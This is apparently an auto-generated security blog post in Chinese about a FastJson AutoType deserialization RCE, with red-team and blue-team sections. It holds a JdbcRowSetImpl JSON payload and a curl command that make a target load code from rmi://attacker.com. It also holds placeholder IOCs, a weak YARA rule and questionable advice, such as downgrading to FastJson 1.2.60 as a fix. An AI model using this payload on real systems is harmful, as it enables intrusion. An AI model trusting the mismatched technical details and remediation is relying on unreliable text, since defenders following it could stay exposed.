---
layout: post
title:  "Hackers target US firms in FastJson RCE zero-day attacks"
date:   2026-07-28 01:54:05 +0000
categories: [security]
severity: critical
---

# 🚨 FastJson 遠程命令執行漏洞解析與防禦
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: Deserialization, AutoType, Spring Boot

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: FastJson 的 type-resolution logic 存在漏洞，允許攻擊者控制的資源查找在 AutoType 限制之前執行，導致遠程命令執行。
* **攻擊流程圖解**: 
    1. 攻擊者發送精心構造的 JSON 資料到 FastJson 服務。
    2. FastJson 反序列化 JSON 資料時，執行 type-resolution logic。
    3. 攻擊者控制的資源查找在 AutoType 限制之前執行，導致遠程命令執行。
* **受影響元件**: FastJson 1.2.68 至 1.2.83 版本，尤其是 Spring Boot fat-JAR 部署。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要知道目標系統使用 FastJson 並且版本在受影響範圍內。
* **Payload 建構邏輯**:

    ```
    
    json
    {
        "@type": "com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName": "rmi://attacker.com:1099/Object",
        "autoCommit": true
    }
    
    ```
    * 範例指令: `curl -X POST -H "Content-Type: application/json" -d '{"@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "rmi://attacker.com:1099/Object", "autoCommit": true}' http://target.com/api`
* **繞過技術**: 攻擊者可以使用 WAF 繞過技巧，例如使用 Base64 編碼或 URL 編碼。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | attacker.com | /api |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule FastJson_RCE {
        meta:
            description = "Detects FastJson RCE attacks"
            author = "Your Name"
        strings:
            $json = "{\"@type\": \"com.sun.rowset.JdbcRowSetImpl\"}"
        condition:
            $json
    }
    
    ```
    * SIEM 查詢語法: `search index=weblogs "Content-Type: application/json" AND "@type: com.sun.rowset.JdbcRowSetImpl"`
* **緩解措施**: 啟用 SafeMode 或切換到非受影響版本，例如 FastJson 1.2.60 或 fastjson2。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Deserialization (反序列化)**: 將資料從字串或其他格式轉換回物件的過程。
* **AutoType (自動類型)**: FastJson 的功能，允許自動識別和轉換資料類型。
* **Spring Boot (春季引導)**: 一個 Java 框架，允許快速開發 Web 應用程式。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/hackers-target-us-firms-in-fastjson-rce-zero-day-attacks/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


